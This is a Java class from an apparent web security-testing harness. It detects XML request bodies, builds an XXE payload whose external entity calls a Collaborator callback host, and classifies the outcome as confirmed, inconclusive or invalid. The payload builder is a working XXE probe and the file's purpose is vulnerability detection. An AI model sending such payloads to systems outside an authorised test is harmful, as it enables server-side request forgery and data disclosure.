package com.harness.llm.logic;

import java.util.List;
import java.util.regex.Pattern;

/**
 * Classification logic for xxe_validation. Montoya-free, deliberately
 * mirrors SsrfCallbackLogic's Verdict/Evidence/interaction-list shape
 * (CONFIRMED/INCONCLUSIVE/INVALID, a list of observed Collaborator
 * interaction types) since this is the same underlying mechanism --
 * an out-of-band callback -- applied to a different injection point
 * (an XML body's external entity declaration instead of a URL-shaped
 * parameter). The executor is responsible for actually calling
 * Collaborator and resending; this class only decides what the target
 * looks like and what the result means.
 */
public final class XxeCollaboratorLogic {

    public enum Verdict { CONFIRMED, INCONCLUSIVE, INVALID }

    public record Evidence(Verdict verdict, double confidence, boolean confirmed, String summary, String detail) {}

    private static final Pattern XML_DECLARATION = Pattern.compile("^\\s*<\\?xml\\b", Pattern.CASE_INSENSITIVE);
    private static final Pattern XML_ROOT_ELEMENT = Pattern.compile("^\\s*<[a-zA-Z_][\\w:-]*[\\s>]");

    private XxeCollaboratorLogic() {}

    /**
     * True if this exchange is worth an XXE test at all: either the
     * Content-Type says so, or the body itself is well-formed-looking
     * XML. Checking the body too (not just Content-Type) matters
     * because some real APIs accept XML with an incorrect or generic
     * Content-Type header.
     */
    public static boolean isXmlLike(String contentType, String body) {
        if (contentType != null && contentType.toLowerCase().contains("xml")) return true;
        if (body == null || body.isBlank()) return false;
        String trimmed = body.stripLeading();
        return XML_DECLARATION.matcher(trimmed).find() || XML_ROOT_ELEMENT.matcher(trimmed).find();
    }

    /**
     * Builds a minimal, schema-agnostic external-entity test document
     * rather than trying to graft an entity reference into the
     * original body's (unknown) schema. This deliberately replaces the
     * original body entirely: external entity resolution happens
     * during low-level XML parsing, generally before any
     * application-level schema validation, so a Collaborator
     * interaction is expected to fire even if the application then
     * rejects the document afterward for looking nothing like what it
     * expected. If the parser never reaches entity resolution at all
     * (e.g. it validates against a schema before parsing, which is
     * unusual but possible), this specific payload shape would produce
     * a false negative -- inconclusive, not a proof of safety.
     */
    public static String buildPayload(String collaboratorHost) {
        return "<?xml version=\"1.0\"?>\n"
                + "<!DOCTYPE harness [<!ENTITY xxe SYSTEM \"http://" + collaboratorHost + "/xxe\">]>\n"
                + "<harness>&xxe;</harness>";
    }

    public static Evidence evaluate(boolean wasXmlLike, List<String> interactionTypes) {
        if (!wasXmlLike) {
            return new Evidence(Verdict.INVALID, 0.0, false,
                    "This request's body is not XML (by Content-Type or content shape) -- xxe_validation "
                            + "does not apply.", "");
        }
        List<String> types = interactionTypes == null ? List.of() : interactionTypes;
        if (!types.isEmpty()) {
            return new Evidence(Verdict.CONFIRMED, 0.93, true,
                    "A Collaborator interaction (" + String.join(",", types) + ") was observed resulting "
                            + "from an external entity declaration placed in the request body -- the XML "
                            + "parser resolved an external entity, confirming server-side request forgery "
                            + "and/or local file disclosure risk via XXE.",
                    "interactions=" + types);
        }
        return new Evidence(Verdict.INCONCLUSIVE, 0.4, false,
                "No Collaborator interaction was observed for the external entity payload. This does not "
                        + "prove the endpoint is safe -- the parser may resolve entities without any "
                        + "network-visible side effect (e.g. resolving a local file into the response "
                        + "instead), or entity resolution may be disabled at the parser level, which this "
                        + "specific probe can't distinguish from \"never reached the parser at all\".", "");
    }
}
